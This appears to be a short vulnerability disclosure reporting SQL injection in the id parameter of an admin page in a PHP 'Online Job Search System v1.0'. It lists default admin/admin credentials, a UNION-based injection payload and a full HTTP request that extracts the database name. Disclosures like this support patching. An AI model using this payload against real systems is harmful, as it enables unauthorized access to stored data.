# Complete Online Job Search System v1.0 has SQL injection

BUG_Author：朝阳

The password for the backend login account is: admin/admin

vendors: https://www.campcodes.com/projects/php/online-job-search-system-using-php-mysql-free-download/

Vulnerability File: /eris/admin/company/index.php?view=edit&id=

Vulnerability location: /eris/admin/company/index.php?view=edit&id=,id

Current database name: erisdb

[+] Payload: /eris/admin/company/index.php?view=edit&id=-3%27%20union%20select%201,database(),3,4,5,6--+ // Leak place ---> id

```sql
GET /eris/admin/company/index.php?view=edit&id=-3%27%20union%20select%201,database(),3,4,5,6--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=mho0fs263l0tis8l6v3lqpu6q4
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/170849041-4b0d81d6-8f1f-4a07-9166-ae5e670e336d.png)

![image](https://user-images.githubusercontent.com/54017627/170848995-09be03d4-6073-4810-afbc-053ede963d39.png)
